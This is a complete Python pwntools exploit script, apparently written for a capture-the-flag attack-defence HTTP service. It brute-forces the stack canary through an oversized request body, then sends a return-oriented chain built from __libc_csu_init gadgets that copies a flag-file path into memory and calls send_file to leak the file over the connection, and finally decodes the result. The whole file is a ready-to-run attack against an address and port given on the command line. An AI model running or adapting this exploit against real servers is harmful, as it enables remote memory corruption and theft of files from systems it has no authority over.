#!/usr/bin/python
# from pwn import *
from pwnlib import *
import re
import copy
import datetime
import time
import sys

context.log_level = "error"

remote = lambda x, y: tubes.remote.remote(x, y) 
p64 = lambda x: util.packing.p64(x) 
ELF = lambda x: elf.elf.ELF(x)

CRLF = "\r\n"

request = [
    "GET /index.html HTTP/1.1",
    "Host: localhost:4000",
    "Connection: keep-alive"
]

def make_request(request, header = None):
	request_tmp = copy.deepcopy(request)
	if header is not None:
		request_tmp.append(header)
	return CRLF.join(request_tmp)+CRLF+CRLF

def send_request(sock, request, header = None, payload=''):
	sock.send(make_request(request, header) + payload)
	response = sock.recvuntil('\r\n\r\n', timeout = 0.05)
	if response == '':
		return response
	else:
		length = re.findall('Content-Length: [0-9]+', response)
		if len(length) > 0:
			length = length[0].split(' ')[1]
			response += r.recv(int(length))
	return response

def dec(cip):
	cip = list(cip)
	length = len(cip)
	for i in range(length - 2, -1, -1):
		cip[i] = chr((ord(cip[i]) ^ ord(cip[i + 1])) % 256)

	for i in range(length - 2, -1, -1):
		cip[i] = chr((ord(cip[i]) + ord(cip[i + 1])) % 256)

	for i in range(length - 2, -1, -1):
		cip[i] = chr((ord(cip[i]) - ord(cip[i + 1]) + 256) % 256)

	for i in range(length - 2, -1, -1):
		cip[i] = chr((ord(cip[i]) + ord(cip[i + 1])) % 256)

	for i in range(length - 2, -1, -1):
		cip[i] = chr((ord(cip[i]) + ord(cip[i + 1])) % 256)

	for i in range(length - 2, -1, -1):
		cip[i] = chr((ord(cip[i]) - ord(cip[i + 1]) + 256) % 256)

	for i in range(length - 2, -1, -1):
		cip[i] = chr((ord(cip[i]) - ord(cip[i + 1]) + 256) % 256)

	for i in range(length - 2, -1, -1):
		cip[i] = chr((ord(cip[i]) + ord(cip[i + 1])) % 256)

	for i in range(length - 2, -1, -1):
		cip[i] = chr((ord(cip[i]) ^ ord(cip[i + 1])) % 256)

	for i in range(length - 2, -1, -1):
		cip[i] = chr((ord(cip[i]) ^ ord(cip[i + 1])) % 256)

	for i in range(length - 2, -1, -1):
		cip[i] = chr((ord(cip[i]) - ord(cip[i + 1]) + 256) % 256)

	for i in range(length - 2, -1, -1):
		cip[i] = chr((ord(cip[i]) + ord(cip[i + 1])) % 256)

	for i in range(length - 2, -1, -1):
		cip[i] = chr((ord(cip[i]) ^ ord(cip[i + 1])) % 256)

	for i in range(length - 2, -1, -1):
		cip[i] = chr((ord(cip[i]) + ord(cip[i + 1])) % 256)

	for i in range(length - 2, -1, -1):
		cip[i] = chr((ord(cip[i]) ^ ord(cip[i + 1])) % 256)

	for i in range(length - 2, -1, -1):
		cip[i] = chr((ord(cip[i]) - ord(cip[i + 1]) + 256) % 256)

	for i in range(length - 2, -1, -1):
		cip[i] = chr((ord(cip[i]) ^ ord(cip[i + 1])) % 256)

	for i in range(length - 2, -1, -1):
		cip[i] = chr((ord(cip[i]) ^ ord(cip[i + 1])) % 256)

	for i in range(length - 2, -1, -1):
		cip[i] = chr((ord(cip[i]) + ord(cip[i + 1])) % 256)

	for i in range(length - 2, -1, -1):
		cip[i] = chr((ord(cip[i]) - ord(cip[i + 1]) + 256) % 256)

	for i in range(length - 2, -1, -1):
		cip[i] = chr((ord(cip[i]) ^ ord(cip[i + 1])) % 256)

	for i in range(length - 2, -1, -1):
		cip[i] = chr((ord(cip[i]) ^ ord(cip[i + 1])) % 256)

	for i in range(length - 2, -1, -1):
		cip[i] = chr((ord(cip[i]) - ord(cip[i + 1]) + 256) % 256)

	for i in range(length - 2, -1, -1):
		cip[i] = chr((ord(cip[i]) - ord(cip[i + 1]) + 256) % 256)

	for i in range(length - 2, -1, -1):
		cip[i] = chr((ord(cip[i]) - ord(cip[i + 1]) + 256) % 256)

	for i in range(length - 2, -1, -1):
		cip[i] = chr((ord(cip[i]) ^ ord(cip[i + 1])) % 256)

	for i in range(length - 2, -1, -1):
		cip[i] = chr((ord(cip[i]) - ord(cip[i + 1]) + 256) % 256)

	for i in range(length - 2, -1, -1):
		cip[i] = chr((ord(cip[i]) - ord(cip[i + 1]) + 256) % 256)

	for i in range(length - 2, -1, -1):
		cip[i] = chr((ord(cip[i]) ^ ord(cip[i + 1])) % 256)

	for i in range(length - 2, -1, -1):
		cip[i] = chr((ord(cip[i]) + ord(cip[i + 1])) % 256)
	return ''.join(cip)

if len(sys.argv) != 3:
	print 'Usage: exploit [ip] [port]'
	sys.exit()

start = datetime.datetime.now()

ip = sys.argv[1]
port = int(sys.argv[2])
r = remote(ip, port)

print send_request(r, request)

payload = 'a'*0x200+'b'*8

canary = ''
for i in range(8):
	for case in range(0x00, 0x100):
		print case, 
		tmp = canary + chr(case)
		resp = send_request(r, request, header="Content-Length: %d" %(520+len(tmp)), payload = payload+tmp)
		if resp != '':
			print resp
			canary += chr(case)
			break
print 'canary: 0x%s' %(canary.encode('hex'))

elf = ELF('/service/bin/httpd')
# elf = ELF('./service/bin/httpd')
memcpy_got = elf.got['memcpy']
gadget = elf.symbols['set_error_document']+1350
gadget1 = elf.symbols['__libc_csu_init']+90
gadget2 = elf.symbols['__libc_csu_init']+64

"""
gadget:
	0x00000000004065f7 <+1350>:	add    $0xe8,%rsp
	0x00000000004065fe <+1357>:	pop    %rbx
	0x00000000004065ff <+1358>:	pop    %rbp
	0x0000000000406600 <+1359>:	retq
gadget1:
	0x000000000040715a <+90>:	pop    %rbx
	0x000000000040715b <+91>:	pop    %rbp
	0x000000000040715c <+92>:	pop    %r12
	0x000000000040715e <+94>:	pop    %r13
	0x0000000000407160 <+96>:	pop    %r14
	0x0000000000407162 <+98>:	pop    %r15
	0x0000000000407164 <+100>:	retq
gadget2:
	0x0000000000407140 <+64>:	mov    %r13,%rdx
	0x0000000000407143 <+67>:	mov    %r14,%rsi
	0x0000000000407146 <+70>:	mov    %r15d,%edi
	0x0000000000407149 <+73>:	callq  *(%r12,%rbx,8)
"""

def get_addr(c):
	return list(elf.search(c))[0]

flag_file = '/var/ctf/flag'
# flag_file = '/hd/ctf/flag'
flag_addr = elf.bss()
send_file = p64(elf.symbols['send_file'])
send_file_addr = elf.bss() + len(flag_file) + 1

rbx = 0
rbp = 1

payload += canary							# rbp-0x18
payload += 'c'*0x10
payload += p64(rbp)
payload += p64(gadget)						# stack pivot
payload += 'd'*(0xe8+0x8+0x8)				# add rsp, 0xe8 ; pop rbx ; pop rbp ; ret

payload += p64(gadget1)
for i in range(len(flag_file)):
	payload += p64(rbx)						# pop rbx
	payload += p64(rbp)						# pop rbp
	payload += p64(memcpy_got)				# pop r12
	payload += p64(1)						# pop r13	-> mov r13, rdx
	payload += p64(get_addr(flag_file[i]))	# pop r14	-> mov r14, rsi
	payload += p64(flag_addr+i)				# pop r15 	-> mov r15, edi
	payload += p64(gadget2)					
	payload += p64(0)						# add rsp, 0x8

for i in range(len(send_file)):
	payload += p64(rbx)						# pop rbx
	payload += p64(rbp)						# pop rbp
	payload += p64(memcpy_got)				# pop r12
	payload += p64(1)						# pop r13	-> mov r13, rdx
	payload += p64(get_addr(send_file[i]))	# pop r14	-> mov r14, rsi
	payload += p64(send_file_addr+i)		# pop r15 	-> mov r15, edi
	payload += p64(gadget2)	
	payload += p64(0)						# add rsp, 0x8

payload += p64(rbx)							# pop rbx
payload += p64(rbp)							# pop rbp
payload += p64(send_file_addr)				# pop r12
payload += p64(flag_addr)					# pop r13	-> mov r13, rdx
payload += p64(4)							# pop r14	-> mov r14, rsi
payload += p64(0)							# pop r15 	-> mov r15, edi
payload += p64(gadget2)

send_request(r, request, header="Content-Length: %d" %(len(payload)), payload = payload)
time.sleep(3)

end = datetime.datetime.now()

print 'time:',
print end-start
flag = r.recv(1024)
flag = dec(flag)
print flag
r.close()